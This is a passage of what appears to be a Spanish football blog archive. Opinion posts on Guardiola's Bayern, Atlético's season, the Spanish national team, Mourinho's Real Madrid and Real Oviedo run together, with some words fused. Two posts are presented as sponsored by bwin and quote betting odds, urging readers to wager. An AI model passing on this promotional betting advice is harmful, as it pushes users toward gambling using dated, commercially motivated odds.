altura con demasiada antelación ha causado un transtorno grave al equipo. Que la estancia que Capello programó en los montes austriacos les ha chupado la sangre a los chavales.Como ejemplo de buenas prácticas sugiere no entrenar en altura durante tanto tiempo. Según Souness a las tres o cuatro semanas de machacarse con el sistema, el cuerpo está agotado por la falta de oxígeno. Sólo a partir de ahí comienza a funcionar. Hasta entonces necesita aire y trabaja más para conseguirlo lo cual se traduce sobre el verde. ¿Error del cuerpo médico? Se podría investigar. Lo cierto es que ver a los futbolistas ingleses (tradicionalmente afiládisimos en la marca y generosos en el deroche físico) llegar dos segundos tarde a cada pelota, a cada tobillo en disputa me extraña. Resulta chocante pero, con el debido respeto (el Liverpool, el bigote, la bandera y todo eso) lo de los ingleses parece más un problema de concepto y mente que médico. Lo que nos quiere vender usted,  señor Souness, y con ello remato estos tres párrafos en los que le he dejado explicarse es un barril rebosante de humo del tamaño del Esatadio de Wembley. “No nos merecíamos este resultado”, se quejó Pep Martí tras perder contra el Oviedo en el Tartiere. Luis César Sampedro resumió el empate del Albacete contra los azules en dos goles de puro infortunio. Bordalas celebró “un punto en un campo muy complicado”. Milla lamentó no haber sido capaz de “rematar la faena” El Osasuna de Enrique Martin “hizo todo para ganar” y el Zaragoza de Carreras cayó en un partido sin apenas ocasiones.Los chés llevan varios años plantando cara al Barcelona con mucha dignidad, pero raramente ha conseguido competir más de medio partido contra los azulgrana. Lo vimos este año en el partido de Liga y en la ida de la Copa, con grandes primeros tiempos e inferioridad en la segunda mitad, y sólo un rato en la vuelta del torneo del KO, donde el golazo de Fàbregas derrumbó a unos jugadores repentinamente conscientes de la montaña que tenían delante. Mañana gozarán de una nueva oportunidad, con dos futbolistas que comparten rol especialmente felices: Albelda, por su renovación, y Mehmet Topal, “rehabilitado” tras el sensacional golazo del Britannia. Con ellos y el sobresaliente Soldado espera Emery poner más tierra de por medio ante un Español al que ya saca siete puntos, y sobre todo romper una barrera psicológica que lastra el crecimiento del equipo. Baja clave la de Banega por problemas de rodilla.Es costumbre que los partidos entre equipos poderosos generen buenas cuotas para los aficionados a las apuestas. En bwin, por ejemplo, se paga la victoria local a 1.25, una buena opción para jugarse dinero si tenemos en cuenta que el Barça firma una hoja de servicios como local casi inmaculada. No es descabellado un empate, que se paga nada menos que a 5.50, y no hablemos la victoria levantina, a 11.50. Quien espere un partido contenido, debe saber que dos o menos goles se pagan a 2,50. Si creemos que el Valencia empezará bien, podemos plantearnos que una victoria che al descanso da 5.75, y un gol de la dupla atacante del Valencia, Jonas–Soldado, se paga mínimo a tres euros. Además, quien no se crea que Messi está mal puede jugársela a su doblete –no sería el primero ante el Valencia- con cuota 2.90. Mucho donde elegir. Quizá el simple hecho de que resulte pertinente hablar ya de su legado es uno de los mejores elogios que se le pueden hacer a Pep Guardiola, quien a pesar de su alopecia y su aspecto algo avejentado, acaba de cumplir cuarenta y cinco años. Sobre su obra en el Barcelona hay poco que hablar: construyó la maquinaria más perfecta que ha impuesto su ley en el fútbol moderno, tiene una enorme cuota de responsabilidad en la conversión de un jugador estupendo en quizá el mejor de todos los tiempos, y su Pep team se ha convertido en la piedra de toque definitiva, el paradigma de la excelencia. Tanto es así, que incluso hace palidecer a su lado al imperial Barça de nuestros días, una máquina de ganar partidos y títulos que, sin embargo, resulta algo tosco en comparación con lo que ofrecía aquel equipo, mucho más coral y armónico. Lo que hizo Guardiola esos cuatro años ya no se lo quitará nadie. Lo cambió todo. Pero la vida sigue, y es un axioma que para cagarla en cualquier aspecto de la vida sólo tienes que dedicarte a lo mismo durante el tiempo suficiente –bien lo sabía Cruyff, que se bajó del caballo a tiempo-, así que llegamos a la pregunta que queremos plantear aquí. El periplo de Guardiola en el Bayern, ¿ha resultado un éxito, un fracaso, o se ha quedado a medias? El debate en cuestión se encendió en twitter hace unas noches, con el guante lanzado por el gran Alberto Egea, y varios insomnes inveterados saltamos a por el hueso como un dobermann en época de vacas flacas.Los más guardiolistas apelan a que en el Bayern se le contrató para que cambiara la manera de jugar del equipo, y lo ha hecho sin dejar de ganar y consiguiendo motivar a una plantilla que venía de ganar un triplete histórico. Partiendo del postulado innegociable del juego de posición, ha dotado al equipo de una riqueza táctica casi infinita, convirtiéndolo en una especie de Proteo futbolístico, que tan pronto podía recordar el 2-3-5 de los años 50 como mutar en un 3-4-3 cual Ajax de Michels. Además, es indudable que muchos de sus jugadores son bastante mejores que cuando él llegó –Alaba es el modelo, de lateral izquierdo a jugador total- pues han adquirido la habilidad de desenvolverse con suficiencia en posiciones en principio extrañas a ellos. Es muy probable que muchos de los partidos de este Bayern se estudien durante años en las escuelas de entrenadores. Y todo esto sin olvidar, por supuesto, las (casi) tres ligas conseguidas con diferencias siderales, los torneos menores, y las semifinales de Champions League, quizá el mínimo exigible para un club como éste. Estos logros están ahí.Por el contrario, los detractores del noi de Santpedor invocan dos argumentos difíciles de refutar. El primero, por supuesto, las dos palizas inmisericordes que recibió el Bayern en la Liga de Campeones, que según cierta corriente de opinión es el único criterio válido para calibrar las temporadas de los grandes gigantes europeos; no hay duda alguna de que el 0-4 de Ancelotti y compañía marca un mojón negro y pestilente en la orgullosa historia del Bayern, y que no le fue a la zaga su triste regreso al Camp Nou la temporada siguiente. Como deducción lógica de esta manera de pensar, las casi tres Bundesligas conquistadas no tienen valor alguno, porque para los bávaros ganar en su torneo doméstico ha sido (presuntamente) la regla histórica, y el Bayern no gana la liga, sino que solamente puede perderla. Por tanto, la enorme expectativa generada hace tres años no se ha cumplido, y de ahí debe deducirse el fracaso del catalán. El arriba firmante se decanta por una posición intermedia. A falta de una Champions League que sin duda va a pesar en el juicio final que se realice sobre Guardiola, el catalán ha cubierto con bastante éxito su periplo por Alemania, y este trienio no ha rebajado un ápice su cotización. Sin embargo, no creo que haya respondido totalmente a las enormes expectativas que levantó su llegada, ni que vaya a dejar un legado duradero en el club muniqués. En este sentido, es interesante analizar la elección de Ancelotti como sucesor: un entrenador pragmático, de la vieja escuela, que de ningún modo va a profundizar en el fútbol moderno y complejo que ha propuesto Pep, ni mucho menos en su laberinto de variantes tácticas e innovadores métodos de entrenamiento. En muchos sentidos se trata de una regresión a un contexto más relajado y menos exigente para futbolistas y público, y no de una continuación de la filosofía anterior. Suscribo todas y cada una de las razones ya mencionadas que defienden el trabajo de Guardiola en el Bayern, y creo que juzgar la labor de un técnico por un criterio tan estricto como ganar la Copa de Europa es sumamente injusto. Hay que recordar que en las dos semifinales disputadas contra Madrid y Barça, el equipo llegó con muchos problemas físicos, y que inclusive Pep tuvo que soportar, en medio del enfrentamiento contra el Madrid, la muerte de su querido colaborador y amigo Tito Vilanova. No son excusas para los dos ridículos, pero sí atenuantes que suavizan el juicio en una competición donde un partido malo te envía a casa. Aunque al final todos sepamos que es muy difícil –no imposible- construir una leyenda sin orejona que la avale. Mi impresión es que el motivo principal de que la obra de Guardiola no haya quedado completa en el Bayern es que su equipo no ha mostrado la fiabilidad necesaria frente a rivales de tronío, ni ha exhibido frente a ellos el dominio abrumador con el que ha tiranizado la competición doméstica, y que fue la mayor impronta de su Barcelona. Con contadas excepciones –como aquel partido en el campo del City- el estilo del Bayern ha sido casi siempre reconocible contra estos rivales, pero no se ha impuesto claramente a ellos ni en el juego ni en el resultado. Le costó entender al Borussia de Klopp, contra Arsenal,  United u Oporto vivió eliminatorias en el filo de la navaja, y al final llegaron las catástrofes frente los colosos españoles. Dicho de otro modo, más grave aún que las eliminaciones europeas fue el hecho de que podía haber ocurrido antes con total naturalidad. Y eso no es lo que esperaban los aficionados que le habían visto crear el martillo pilón en el Barcelona y le observaban arrasar rivales en una Bundesliga que de todos modos el propio Bayern, según su costumbre, había descafeinado. Así las cosas y pesándolo todo, Guardiola ha sido un buen entrenador para el Bayern, y ha dejado una obra que valorarán más los profesionales que los aficionados. Nada más y nada menos. Puede decirse que la extrañísima y finalmente triunfante temporada que ha vivido el Atlético de Madrid comenzó unos dos meses después de lo habitual, el 23 de octubre.El equipo colchonero llegaba de recibir dos vapuleos consecutivos, uno en el antiguo Sadar frente a Osasuna y otro, más comprensible, en Stamford Bridge, y la directiva decidía destituir a un Abel Resino a quien se había mantenido a regañadientes y dar mando en plaza a Quique Flores, a la sazón sin equipo tras su etapa benfiquista. Atrás quedaba un pésimo comienzo de Liga, con una sola victoria y humillación en el Camp Nou, empate ante el Apoel y derrota en Oporto que condenaban desde el principio al Atleti en la Liga de Campeones, y sobre todo un ambiente irrespirable en el Calderón contra una directiva que apenas había reforzado el equipo  -poco más que Asenjo y Juanito– y con la que hay cuentas pendientes durante años. Para mayor desgracia, la dupla Forlán–Agüero no funcionaba como en el pasado, y el uruguayo comenzó un divorcio con la grada que duró varios meses.No parecía Quique, con un pasado madridista que se perdona mal a esa orilla del Manzanares, la persona idónea para aglutinar de nuevo a la dividida masa social. Sus primeros meses no fueron buenos: los constantes fallos defensivos lastraban el rendimiento del equipo –que recibió al menos un gol en cada uno de los primeros diez partidos de Liga-, no lograba hilar un centro del campo decente donde gente como Cléber o Maxi eran sombras de lo que habían sido, y acababa fallando hasta la suerte, como en el encuentro de Riazor. Eliminado ya de la Champions, quizá el punto más bajo de la temporada lo vivió el Atleti en el nuevo Colombino, donde se llevó como regalo de Reyes un contundente y justo 3-0 administrado por un equipo de Segunda División.Fue la catarsis. Tras el ridículo, el entrenador salió ante los medios de comunicación rajando contra los futbolistas, en una decisión controvertida que los hechos demostraron como acertada. Tras el batacazo, el Atlético reaccionó goleando en Valladolid, y sobre todo con la épica remontada ante el propio Recre (5-1) que puede asumirse como el punto de inflexión de la temporada. La tranquilidad adquirida tras estos triunfos permitió a Quique ir reformando una alineación donde Reyes fue asumiendo protagonismo y galones, y en la que De Gea se consolidaba como portero titular y gran revelación de la temporada. La victoria ante el Barça en Liga –único equipo que venció al campeón en la competición doméstica- supuso además una extraordinaria inyección de moral.A partir de finales de enero, la familia atlética asumió que el papel del equipo en liga no iba a pasar de mero comparsa en tierra de nadie, y que el Grial rojiblanco de la temporada se encontraba en los torneos del KO. Tras sufrir ante el Celta y arrasar al Racing en el Calderón, los colchoneros se aseguraban la final de Copa con tres meses de antelación, y se podían concentrar en la agotadora, por larga, Europa League. Los rojiblancos, que apenas ganaron partidos en la competición, convirtieron sus enfrentamientos en homenajes a la agonía, como las vividas para defender el empate ante Sporting de Portugal o Valencia, o los goles milagrosos de Forlán, reconciliado con la hinchada, en Estambul y Liverpool.Así llego el Atlético a esta última semana, donde salió cara por un lado y cruz por la otra, en la que los aficionados volvieron a invadir Neptuno, recordaron realmente por qué son del Atleti y, sobre todo, sintieron el cariño por un equipo en construcción que ha demostrado que con tranquilidad los objetivos son posibles. Falta ver si lo ocurrido al final de esta temporada se tomará como enseñanza o no al sur de Madrid.Lo mejor: la capacidad de sufrimiento del equipo en los partidos decisivos de la temporada, los goles históricos de Forlán, las apariciones de De Gea y Domínguez, la rehabilitación de Reyes y el empaque mostrado en la segunda mitad del curso.Lo peor: la agitación vivida durante la primera mitad de la temporada, la ruptura social, los problemas en la zaga y la pésima actitud mostrada en muchos momentos de la competición liguera. España afronta el martes ante Liechtenstein (Las Gaunas, 22 horas) el compromiso que, si no media catástrofe casi inimaginable, clasificará a la selección para la Eurocopa 2012, y le dará la oportunidad de intentar revalidar el título. Por muy habitual que resulte en los últimos tiempos, no deja de ser remarcable que España es, junto con Holanda, el único equipo que ha vencido en todos los partidos de clasificación, aunque sus cifras son algo más modestas que la de unos neerlandeses que están firmando una fase de grupos escandalosa. Los éxitos recientes convierten estos partidos en una suerte de engorro inevitable para muchos aficionados, y no conviene olvidar que no hace tanto estábamos jugando repescas, y que hace menos de una década hubo dos campeonatos en los que España no tocó el famoso cuarto de final. Se acostumbra uno mucho más fácilmente a ser grande que a ser pequeño.Así las cosas, el último asunto que parece preocupar estos días en el entorno de la selección es el partido del martes. En su lugar, se habla sobre todo de la resaca que ha dejado el amistoso contra Chile, un partido estupendo que mostró en cada tiempo lo mejor y peor de los dos equipos. Del enfrentamiento final no hay mucho que decir, salvo que una pelea de este tipo es indeseable en cualquier partido –más en un amistoso- y que resulta algo triste que la pelea merezca una consideración positiva porque haya mostrado una presunta unión entre los futbolistas de la Roja. Se lleven como se lleven, la memoria no alcanza a recordar cuándo estos tipos perdieron su último partido oficial, y lo lógico es pensar que este grupo de campeones del mundo y de Europa son lo suficientemente profesionales para dejar de lado las rencillas que puedan tener y remar en el mismo barco cuando se ponen la camiseta roja. Está claro que siempre es deseable la armonía y el buen rollo, pero la historia del fútbol está llena de equipos campeones donde proliferaban rencores, facciones y banderías, y que a la hora de la verdad eran más temibles que otras escuadras llegadas directamente de los mundos de Yupi. En clubes como el Bayern, por ejemplo, esta situación es una especie de marca de fábrica.Un asunto que quizá ha asustado más al personal es el de la defensa, sobre todo después del meneo recibido en el primer tiempo de Lausana por los Alexis, Valdivia y compañía. Contra la opinión de Del Bosque, por cierto, que preferiría que el tiempo hasta la Eurocopa pasase entre bolo y bolo, uno cree que es bueno que el equipo nacional se mida contra escuadras que puedan exigirle, y que por tanto permitan saber dónde se encuentran sus posibles carencias. Los artistas chilenos mostraron que ahora mismo Albiol no está para la absoluta –lo mínimo que necesita un central son partidos-, y que Javi Martínez puede ser en esa posición sólo un recurso de emergencia. Si no hay novedad, esa posición seguirá cubierta en la Euro por Puyol y Piqué, pero no parece que el gran central ilerdense vaya a prolongar mucho más su experiencia internacional, dado que hubo que convencerlo el año pasado para que siguiese. ¿Cuál podría ser la solución a medio plazo? Quizá lo más natural sería pasar a Ramos al centro, donde muchos pensamos que da lo máximo, y meter a Iraola, un lateral técnico y solvente, en la banda derecha. Parece una solución lógica, si no fuera porque don Vicente parece no tenerle fe al vasco. Pero no ve uno a Domínguez o a Víctor Ruiz como titulares indiscutibles de la Roja en menos de un año, y Montoya tiene el grave problema de que en su club está por detrás del número uno en su puesto.Cada semana, y de la mano de bwin, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. Tampoco presenta fácil solución el asunto del lateral izquierdo, una posición patito feo desde hace bastante tiempo, y que hizo suya Capdevila a base de profundidad y pundonor. Ahora que el catalán se encuentra en el comienzo de la cuesta abajo –el Benfica ni siquiera lo ha inscrito en Champions- la selección tiene un problema real en esa posición. No puede considerarse que un futbolista que en su club no va a volver a jugar de tres a corto plazo, y que es diestro, sea una solución realista, por mucho que Arbeloa sea competitivo como pocos y rara vez deje de cumplir el expediente. Quizá el hombre ahora sea José Enrique, que está una buena edad y va a competir a alto nivel, aunque también habrá que observar durante la temporada a Monreal y a Canella.Otro asunto que va a generar debate de aquí a junio es el nueve, en el supuesto de que Del Bosque decida jugar con dos delanteros, que no está claro –menos ahora, que Cesc ha vuelto a España y todo el mundo va a poder constatar semana a semana su enorme dimensión como centrocampista-. El seleccionador parece mantener una confianza infinita en Torres, pero el delantero de Fuenlabrada lleva ya bastantes meses jugando con regularidad y su rendimiento, tanto en clubes como en selección, está bastante por debajo del mínimo exigible a un futbolista de su caché. Ítem más, en un momento de gran cosecha de arietes, con Llorente, Soldado y Negredo pegando fuerte en los equipos más competitivos a priori de la otra Liga. Habrá que ver si Villas Boas consigue recuperar al madrileño, o hay cambio de guardia en la delantera. Un cambio de guardia, por cierto, que no tiene visos de producirse en el portero suplente, y que resulta un escándalo: es muy difícil a día de hoy dar una razón deportiva por la que Reina sea preferido a Valdés, como se ha visto reiteradamente en los últimos amistosos.En cualquier caso, todos estos debates son menores, dado que el inmenso poder de la selección española se halla en su centro del campo, y este sigue intacto. Más allá del debate sobre el doble pivote, la ristra de nombres Alonso–Busquets–Xavi–Cesc–Iniesta–Silva, con Thiago en la rampa de lanzamiento, es ahora mismo garantía de favoritismo ante cualquiera, y su existencia nos hace sentirnos afortunados por vivir este momento. ¿Y qué decir de Liechtenstein? Pues aparte del debate recurrente sobre si estados cuya población cabe en una tribuna del Camp Nou deben saturar aún más los calendarios FIFA y UEFA, encontramos una selección que ya no es la candidata permanente al ridículo de hace unos años. Situada en el puesto 119 del ránking FIFA (un poco por debajo de la mitad), el resultado más abultado que ha recibido en la fase de clasificación fue un 0-4 precisamente de España, le ha sacado cuatro puntos de seis a los lituanos y Escocia sólo fue capaz de ganarles en Hampden sobre la campana. Su mejor futbolista pasa por ser el delantero Mario Frick, y varios de sus jugadores militan en la liga suiza, que viene colocando regularmente equipos en la fase de grupos de la Champions. De todos modos, todo lo que no sea una victoria amplia de España resultaría sorprendente.Está claro que en este partido no tiene mucho sentido apostar por un resultado, porque salvo sorpresa monumental estas apuestas no darán dinero. En cambio, que se marquen más de cinco goles, algo perfectamente posible, se paga a 2,20. Un gol tonto de Liechtenstein se paga a 4,40. Si Xabi Alonso, que está en racha, hace algún gol, el rendimiento es de 2,30, mientras que un último gol de Iniesta, que también está en gran forma, daría 6,50. Finalmente, que haya más goles en el segundo tiempo, algo lógico por la diferencia de condición física, se paga a 2,10. Sigue Mourinho construyendo su apisonadora, y las señales no puedenser más positivas para un madridismo que vive estos días subido a unanube de ilusión. Cristiano –que se ha marcado un póker-, Higuaín yÖzil han hecho pedazos a un pusilánime Racing, que ha evidenciado nulasincronización en su novedosa línea de cinco zagueros, ha dejado unaimagen de pelele muy similar a la del Deportivo de dos semanas antes,y sólo ha conseguido paliar levemente su nefasta impresión con elinvoluntario tanto de Rosenberg, que ha puesto su corpachón entre eldisparo rabioso de Diop y la portería de Casillas. Para entonces, elmarcador era 6-0, y el Bernabéu asistía incrédulo, por primera vez enaños, a un Madrid que presiona en el campo rival incluso ganando conclaridad, que sale resueltamente a por el partido desde el primerminuto, y está generando unos automatismos que, especialmente en lavanguardia, resultan cada vez más difíciles de defender. Es verdadque, Milán aparte, el Real no ha jugado aún contra ningún equipo connombre, pero también lo es que su rendimiento en las últimas semanasestá generando temor en los rivales, y está reforzando a un Mourinhoque necesitaba referencias como ésta para lograr una estabilidad queanteriores entrenadores no gozaron en todo el año. Goleada de suma ysigue. Parece mentira viendo el nivel actual de selecciones como Gales o Irlanda del Norte, pero en el mundial de Suecia 1958 estuvieron presentes las cuatro selecciones británicas –cuyas federaciones, no lo olvidemos, componen la International Board- en una fase final que sólo constaba de dieciséis equipos. La campanada la dio la modesta selección galesa de Allchurch, a quien sólo pudo eliminar en cuartos el gran Brasil de Pelé, y con una sufrida derrota por la mínima. Inglaterra, por su parte, venía recién golpeada por el terrible Munich Air Disaster, y perdió ante la URSS en el partido de desempate tras la ronda de grupos. Los soviéticos, por cierto, serían dos años después los primeros campeones de Europa. Ahora sí que tenemos listos para el bombo los dieciséis equipos que se jugarán la Champions una vez que se convierta en la gran Copa de Europa. El Arsenal, único inglés por confirmar, ha firmado su pase tras una cómoda victoria frente al Partizan (3-1, con otro gol de Nasri), pero lo hará como segundo después de que el sorprendente Shakhtar despachara al bisoño Sporting de Braga (2-0); parece mentira que este equipo eliminase al Sevilla.La Roma consiguió con más pena que gloria el punto que necesitaba en Cluj (1-1), aunque estaba clasificada de todos modos por la derrota del Basilea en el Allianz (3-0), con doblete del resucitado Ribéry; es de esperar que con la doble R de nuevo activa, el Bayern vuelva a ser un equipo a tener en cuenta en las rondas finales de la competición. En los dos grupos que estaban resueltos, el Chelsea ha perdido la oportunidad del pleno cayendo en Marsella (1-0) el día del regreso de Drogba a su amado Velodrome; el Zilina, en cambio, ha consumado el cero que ayer evitó el Bursaspor con su derrota en casa ante el Spartak (1-2) con los rusos luciéndose al contraataque; el Ajax se va con buen sabor de boca tras profanar San Siro (0-2), y Benzema se ha parecido hoy al delantero de los 35 kilos con un triplete ante sus compatriotas del Auxerre (4-0), dejando para el recuerdo una vaselina sin ángulo que sólo puede hacer un tipo que rebose clase.Así las cosas, dejamos aquí un pequeño recordatorio de los equipos que se verán las caras en los octavos que se sortean el viernes 17. Como es conocido, no pueden enfrentarse primeros contra primeros, segundos contra segundos, equipos del mismo grupo o del mismo país. Los primeros juegan la vuelta en casa.Primeros: Barcelona, Bayern Munich, Chelsea, Manchester United, Real Madrid,  Schalke 04, Shakhtar Donetsk, Tottenham Hotspur.Segundos: Arsenal, Copenhague, Inter, Milan, Olympique de Lyon, Olympique de Marsella, Roma, Valencia. Desconocemos si a nuestro compañero Rubén Uría le gusta o no la Navidad, pero lo que es difícil discutir es que le sienta de maravilla para escribir. Sea desde su púlpito de Yahoo o desde la imprescindible Jot Down, lleva todas las vacaciones repartiendo caramelos, sea analizando la actualidad del Atleti –asunto donde es el nombre de referencia- o regalando un articulazo sobre Jake LaMotta que resulta el equivalente escrito de Toro Salvaje. Anoche se despachó a gusto con el Madrid-Málaga, disparando una serie de cuestiones que, en su sutileza y precisión, ocultaban cargas de profundidad que iban más allá del mero partido. Como en DDF somos atrevidos y además nos encanta el clásico formato de preguntas y respuestas –desde el catecismo al capítulo de Ítaca en el Ulises- recogemos el guante y de cabeza al río. El resultado es el siguiente:¿Mérito incuestionable de Mou en el descanso, leyendo el partido, estimulando a los suyos y acertando con los cambios o error de bulto del luso en la confección del once y la teórica falta de mentalización de sus jugadores antes del partido? El mérito de los cambios seguramente proviene de dos factores: por un lado anímico, pues un triple cambio en el descanso supone enviar un claro mensaje de que los hay los jugadores deben arriesgar tanto como arriesga el entrenador al hacerlo; y en cuanto al juego, al introducir al menos dos futbolistas constructores y eliminar a dos que no lo son (además de a Kaká, tan ciclotímico como siempre). Esto no excluye, o incluso refuerza la hipótesis de que el once inicial no funcionó bien, y que el Madrid salió desconectado. ¿Tres cambios de una tacada concuerda con la presunta reputación de técnico defensivo de Mourinho? No es la primera ni la segunda vez que Mourinho se atreve con este tipo de soluciones. La etiqueta de técnico defensivo, absurda si uno contempla globalmente su carrera, procede especialmente de sus enfrentamientos con el Barcelona, y al menos en parte es interesada.Cuando Mou apunta en conferencia de prensa que algunos de sus jugadores se han pasado la Navidad comiendo y cenando en casa de sus padres y sus tías y no ha llegado al grupo como debería ¿es una falta de profesionalidad flagrante de un grupo de jugadores de elite? Es un tema espinoso pontificar sobre qué puede o no puede hacer un futbolista de élite en sus vacaciones. Habría que conocer, por ejemplo, cuáles han sido las instrucciones o recomendaciones del club al respecto. En cualquier caso, poner cinco kilos que juegas el día 3 no puede considerarse demasiado profesional.Si es así ¿por qué motivo Mourinho no alegó esa falta de concentración antes del partido y aguardó a hacerlo después del mismo?No parece fácil poder saber antes de un partido cuál es el grado de concentración de los jugadores. ¿No había demasiada gente esperando a Mourinho con la escopeta cargada por si sus cambios eran un desastre y se le podía pasar factura de manera cainita? Hay gente que está esperando a Mourinho con la escopeta cargada haga lo que haga. Sin embargo, sí es cierto que se asume un enorme riesgo, sobre todo en caso de lesión o expulsión temprana del portero. Del Bosque siempre dice que el tercer cambio hay que pensárselo muchísimo. ¿Es justo comparar los cara a cara de Pellegrini con Mou cuando uno dirige al Málaga y otro, al Real Madrid?Puede pensarse que el famoso 11-0 (ahora 14-2) es un simple dato, si no fuera porque por ahí hay gente que tuvo poder y que desató una campaña contra Pellegrini tan ridícula como su pleitesía posterior incondicional hacia Mourinho. En cualquier caso, es un dato que merece un pie de página en forma de presupuestos, calidad de la plantilla, etc. ¿No sería más ético hacerlo con alguien de su talla, como Guardiola?Un poco más sin duda, pero quizá tampoco del todo, el Madrid no tiene a Messi. Sería interesante una comparativa global de los Madrid-Málaga de los últimos años. ¿El Real Madrid hizo un primer tiempo que fue una ‘basura’ o fue el Málaga el que supo taponar a Alonso, el que impartió una lección con Isco — el mejor, de largo-y el que cerró todas las vías, logrando un efecto embudo en su área?Aquí, por supuesto, entran todos los factores, que en el Madrid había menos creadores de juego que nunca, la presunta apatía y la presión escalonada sobre Alonso. En cualquier caso, el donostiarra no jugó su mejor partido. ¿En la reacción del Madrid, a la tremenda y con toda la testosterona que no tuvo en el primer acto no influyó el desliz mayúsculo de Pellegrini al sustituir a Isco (manija) y Van Nistelrooy (peleón y referencia)? Pudo influir, más lo de Isco –el gran Ruud ya no está para grandes cosas- pero el Málaga perdió su oportunidad antes, con el 0-2 y el Madrid groggy. Ahí debió ir a por la eliminatoria. ¿Alguien hablará, largo y tendido, de la lección de señorío que dio el público del Bernabéu para tributar una cerrada ovación a Ruud Van Nistelrooy cuando su equipo aún iba perdiendo?Es el tipo de cosa que es independiente del resultado o del torneo. Van Nistelrooy fue el gran protagonista de la Liga más cardiaca de la larga historia del Real Madrid, y su comportamiento sobrio y elegante encajó muy bien en el aficionado blanco. Fue un modelo y la gente lo agradece. ¿Khedira sigue siendo un ‘tocho’ o alguien, en algún momento de este curso, va a concederle al teutón cierto crédito? El alemán tiene cierto crédito entre parte de la afición, especialmente para la más mourinhista, que lo ve como un pretoriano del portugués. Otros seguimos pensando que es un lastre del que el Madrid debería desprenderse si en algún momento desea competir de igual a igual con el Barça. La comparación con cualquiera de los centrocampistas azulgrana es casi sonrojante. ¿Benzema seguirá siendo el capricho presidencial que era un cero a la izquierda o se reconocerá que es el mejor jugador de este equipo? Muchos saludamos a Benzema como un sensacional fichaje para el Madrid, pero su primer año fue tan deficiente que llevó a la duda a todo el mundo. Se ha visto que evidentemente no era un capricho, pero sí es posible que el manto presidencial lo salvase en sus peores momentos. A día de hoy puede estar al nivel de Alonso o Cristiano Ronaldo en cuanto a importancia en el equipo. Como dijo alguien ayer en twitter, un mediocentro que juega de delantero. ¿No debería alguien hacerle ver a Cristiano Ronaldo que juega para el Real Madrid y no a la inversa? Esa misma persona que le haga entrar en razón ¿no podría persuadirle de que no es necesario disparar todas y cada una de las faltas del equipo?Sobre esto ya hablamos hace días largo y tendido, así que no merece la pena redundar en ello. La respuesta es sí y sí. ¿El discurso de la basura tendrá consecuencias futuras positivas para el Real Madrid o se resentirá el principio de autoridad del entrenador con el vestuario cuando los resultados no sean tan magníficos? No hay nada positivo en las acusaciones que se formulan desde la sala de prensa que no contenga una charla privada con los jugadores. Sin embargo, mientras Mourinho goce del respaldo del presidente y de la afición nadie podrá discutir su autoridad en el vestuario. Terminamos el post que abrimos ayer sobre la clasificación para la Euro 2012. Grupo E. Otra infortunada serie de selecciones que ha sufrido una “dictadura”. La misma Holanda que se comportó en la final de Sudáfrica como una banda de matones ha jugado un fútbol brillante, a ratos maravilloso, y ha hecho pedazos a sus rivales a base de goleadas. Pleno de victorias, el cazador Huntelaar como máximo goleador de todos los grupos, un 11-0 por ahí… los de Van Marwijk han sido un martillo y llegarán a la Euro con un cartel de aspirante claro. Las migajas se las tienen que repartir entre Suecia y Hungría, con gran ventaja para los nórdicos, que tienen dos oportunidades: fuera en Finlandia y en casa contra Suecia. Los fineses, precisamente, cerrarán su fase en el Estadio Ferenc Puskas, única bala que le queda a los magiares.Garitano admitió tras el 1-1 en Butarque, que al Oviedo “no le hace falta jugar bien para ganar porque tiene mucha pegada”  Joan Carrillo, del Almería, con la derrota en la mochila y el despido rondándole solo atino a destacar un hombre del equipo rival: Esteban. “Pudimos ganar”, explicaba Carlos Terrazas en Anduva. “El Oviedo ha tenido el partido en todo momento ganado”, comentó Oriol Alsina después de un Real Oviedo 2, Llagostera 1 de hace ya tres meses.Que vengan Mourinho o Iker Jiménez a explicarlo, nadie entiende por qué pero el Oviedo lleva diez partidos sin entregar la cuchara.La nostalgia es dulce y pegajosa como la mermelada pero no sirve para alimentarse como es debido. Si al final todo sale bien recordaremos un 1-0 al Tenerife en el día de los enamorados mientras llovía a cántaros y corríamos hacia Primera. Si nos estrellamos como en Génova y Arteixo hablaremos de méritos. Como Martí y Sampedro. El Oviedo es un ‘Boyhood’ con 12 años de bajona y a estas alturas de la película la gente merece volver a la máxima categoría. Pero cuidado, merecer es el verbo más dañino del fútbol. Cuando tu entrenador se suba por primera vez al carrito de los merecimientos móntate en esa bici sin frenos y santíguate. A una pedalada está el abismo. El niño gordo alemán creyó merecer algo mejor en aquella partida antes de moler a palos el ordenador. Las consultas de psicología están colmadas de tipos rotos escuchando que no se lo merecen.No merecemos nada, cuanto antes lo asumamos mejor. Por suerte, este Oviedo parece algo más concreto que el almíbar. Amasa puntos jugando bien, regular y como últimamente, mal. Mereciéndolo y sin merecerlo. Vive aferrado a un sistema definido y la hoja de alineaciones, salvo bajas, comienza a ser un poemario sencillo de memorizar. El equipo no ha notado las ausencias de algunas de sus piezas más importantes y se ha reforzado bien en el mercado de invierno. El Oviedo hoy es el puto error del videojuego, te la puede liar en cualquier momento. Vive al día, justo entre la ambición desmedida y la presión necesaria. Lo tiene todo para que sean otros los merezcan algo más hasta final de temporada. Pero volvamos al título del artículo. He descubierto por qué la LFP no consigue parir una competición equilibrada ni a tiros. Por qué no les acaba de salir una liga sin amaños y racismo o con horarios para humanos. Tienen excusa, están ocupados en hacer magia. Por ejemplo, hoy nos recuerdan que hace 35 años el paraguayo Secundino Ayfuch marcó el gol 2.000 del Espanyol ante el Burgos. Digo magia, porque magia es conseguir que las letras tintineen y te empujen contra la hemeroteca de Mundo Deportivo para que acabes salvando el día. Becarios no, salvo los de la web de LFP. A esos no me los toques. Genios. Escribía Andrés Astruells por la época. “El único que no pierde el sentido del humor en Sarriá es Secundino Ayfuch, que tras sus dos golazos ante Las Palmas anda con la moral por las nubes y en plan cacique del área. Y donde digo cacique, digo Ayatollah, como queda fielmente reflejado en el testimonio gráfico de esta página…”Ayfuch fue defensa como se era defensa antes. Defensa y paraguayo, no digo más. Ayfuch o Aifuch (según que redactor agarrase entonces la máquina de escribir) gastaba además una barba bien frondosa que provocaría ovaciones rendidas en las plazas de Malasaña o en cualquier drama setentero con galán en el ajo. ¿Un mito? . Para corroborar la primera impresión, tanto en lo perico como en lo cinematográfico, acudo a Carlos Marañón, que de ambas cosas sabe un rato. Y corrobora: “Para mí siempre fue ‘Sandokán’. Daba un poco de miedo y tenía un disparo tremendo, durísimo. Recuerdo un gol de falta al Las Palmas…”Además de por presentarse en Sarriá con chilaba, a Ayfuch se le recuerda por repartir fútbol en 